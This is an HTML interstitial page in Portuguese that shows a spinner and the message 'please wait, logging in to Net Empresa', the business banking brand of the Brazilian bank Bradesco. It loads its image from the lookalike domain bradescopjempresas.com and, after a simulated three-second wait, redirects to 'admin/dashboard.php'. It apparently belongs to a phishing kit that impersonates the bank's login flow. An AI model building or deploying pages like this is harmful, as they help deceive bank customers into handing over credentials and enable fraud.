<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Carregando...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        
        .loading-container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        }
        
        .spinner {
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        
        .spinner img {
            width: 100px;
            height: 100px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            color: #333;
            font-weight: bold;
            margin-top: 20px;
        }
        
        .loading-text::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }
        
        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="spinner">
            <img src="https://bradescopjempresas.com/estilos/pictures/f7fc63fa8eed546024b8de4d0b1aa3c7.gif" alt="Carregando">
        </div>
        <div class="loading-text">Aguarde, efetuando login no Net Empresa!</div>
    </div>
    
    <script>
        // Simular carregamento por 3 segundos
        setTimeout(function() {
            // Redirecionar para página de sucesso ou dashboard
            window.location.href = 'admin/dashboard.php';
        }, 3000);
    </script>
</body>
</html>
